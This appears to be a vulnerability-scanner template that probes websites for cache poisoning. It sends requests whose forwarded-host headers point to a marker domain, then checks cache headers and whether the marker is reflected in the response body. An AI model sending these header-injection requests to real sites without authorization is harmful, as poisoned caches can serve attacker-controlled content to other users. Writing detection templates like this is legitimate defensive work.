id: cache-poisoning-xss

info:
  name: Cache Poisoning xss
  author: kauenavarro
  severity: medium

requests:
  - raw:
      - |
        GET /?kauecache=9 HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        X-Forwarded-Prefix: kauenavarro.com
        X-Forwarded-Host: kauenavarro.com
        X-Forwarded-For: kauenavarro.com
        X-Host: kauenavarro.com 
        X-Forwarded-Scheme: nothttps
      - |
        GET /?kauecache=9 HTTP/1.1
        X-Forwarded-Host: kauenavarro.com

      - |
        GET /?kauecache=9 HTTP/1.1
        X-Forwarded-Host: kauenavarro.com
      - |
        GET /?kauecache=9 HTTP/1.1

matchers:
  - type: word
    name: drupal
    words:
          - "X-Drupal-Cache: HIT"
          - "X-VC-Cache: HIT"
          - "X-Drupal-Dynamic-Cache: MISS"

    part: header
  - type: word
    name: drupal
    words:
          - "X-Drupal-Cache: MISS"
          - "X-VC-Cache: MISS"
          - "X-Drupal-Dynamic-Cache: MISS"

    condition: and
    part: header
  - type: word
    words:
      - "kauenavarro"
    condition: and
    part: body

